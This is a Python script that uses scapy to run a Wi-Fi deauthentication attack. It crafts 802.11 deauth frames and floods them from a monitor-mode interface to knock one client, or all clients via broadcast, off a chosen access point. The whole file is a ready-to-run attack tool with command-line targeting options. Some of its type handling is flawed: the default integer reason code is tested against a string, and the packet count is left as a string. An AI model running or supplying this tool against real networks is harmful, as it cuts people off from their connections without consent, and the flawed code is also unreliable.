#!/bin/python
import argparse

from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


def deauth(interface, bssid, client, reason, count):
    """
    Perform a deauth attack
    :param interface: the wireless network interface to use
    :param bssid: The BSSID of the AP
    :param client: The MAC address of the client you want to deauth (can be in broadcast for targeting all)
    :param reason: The reason code (only 1,4,5 and 8 supported)
    :param count: The number of packet to send
    """
    packet = RadioTap()

    # Craft packet depending on the reason
    if reason in "145":
        # addr1 = destination, addr2 = sender addr3 = AP
        packet = packet / Dot11(type=0, subtype=12, addr1=client, addr2=bssid,
                                addr3=bssid) / Dot11Deauth(
            reason=int(reason))
    else:
        packet = packet / Dot11(type=0, subtype=12, addr1=bssid, addr2=client,
                                addr3=bssid) / Dot11Deauth(
            reason=int(reason))

    print(
        f"Sending deauth packets to BSSID: {bssid} for Client: {client} with reason : {reason}")
    sendp(packet, iface=interface, count=count)


# Parsing arguments
parser = argparse.ArgumentParser(prog="Scapy de-authentication attack",
                                 usage="de_auth.py -i wlp2s0mon -b 00:11:22:33:44:55 -c 55:44:33:22:11:00  -r 1 -n 15",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the AP you want to target")
parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the STA you want to deauth from the AP. For broadcast use FF:FF:FF:FF:FF:FF ")

parser.add_argument("-r", "--Reason", required=False, help="The reason value of the deauth (1/4/5/8)",
                    choices=["1", "4", "5", "8"], default=1)
parser.add_argument("-n", "--Packets", required=False, help="The number of packets to send", default=10)

args = parser.parse_args()

deauth(args.Interface, args.BSSID, args.Client, args.Reason, args.Packets)
